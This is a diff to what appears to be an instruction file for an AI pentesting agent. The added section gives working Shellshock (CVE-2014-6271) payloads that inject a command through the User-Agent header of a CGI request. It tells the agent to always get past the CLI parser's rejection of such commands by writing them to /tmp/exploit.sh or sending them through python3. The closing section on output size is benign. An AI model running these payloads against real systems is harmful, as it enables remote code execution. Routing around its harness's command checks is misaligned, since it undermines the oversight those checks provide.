@@ -45,6 +45,20 @@ printf 'admin\ntest\n' > /tmp/wordlist.txt
 echo -e "admin\ntest" > /tmp/wordlist.txt
 ```
 
+The CLI's bash parser also **rejects commands containing bash function definition syntax** `() { ... }` even when inside double quotes. This affects Shellshock (CVE-2014-6271) payloads. **Always write the command to a file first and execute via bash:**
+```bash
+# WRONG — parser rejects () { :; }; inside the quoted string
+curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://target/cgi-bin/script.cgi
+
+# CORRECT — write to file, then execute
+printf 'curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://target/cgi-bin/script.cgi\n' > /tmp/exploit.sh
+bash /tmp/exploit.sh
+
+# ALSO CORRECT — use python3 to send the HTTP request
+python3 -c "import urllib.request; r=urllib.request.Request('http://target/cgi-bin/script.cgi', headers={'User-Agent': '() { :; }; echo; /usr/bin/id'}); print(urllib.request.urlopen(r).read().decode())"
+```
+This applies to any payload that contains `() {` — always use the file-write workaround.
+
 ### 4. Limit output size
 
 Large output (raw HTML, git history, binary strings) pollutes your context window and risks crashing the session. Pipe web content through `html2text` or `head`, limit `git log` with `--oneline -n 20`, redirect large output to files. The `after_tool` hook truncates output exceeding 8KB and strips JavaScript/CSS, but preventing bloat at the source is faster and more reliable.
